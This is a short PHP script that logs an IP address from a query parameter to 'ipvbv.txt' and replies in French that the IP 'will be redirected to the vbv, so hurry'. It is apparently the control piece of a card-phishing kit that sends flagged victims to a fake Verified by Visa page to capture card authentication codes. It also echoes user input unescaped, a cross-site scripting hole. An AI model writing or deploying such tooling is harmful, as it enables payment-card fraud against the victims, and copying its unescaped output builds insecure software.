<?php
    if(isset($_GET['ip']))
    {
        $filename = "ipvbv.txt";
        $fh = fopen($filename, "a");
        fwrite($fh, "".$_GET['ip']."\n");
        fclose($fh);
        
        echo "".$_GET['ip']." va être redirigé vers le vbv donc dépêche ! ";
    }
?>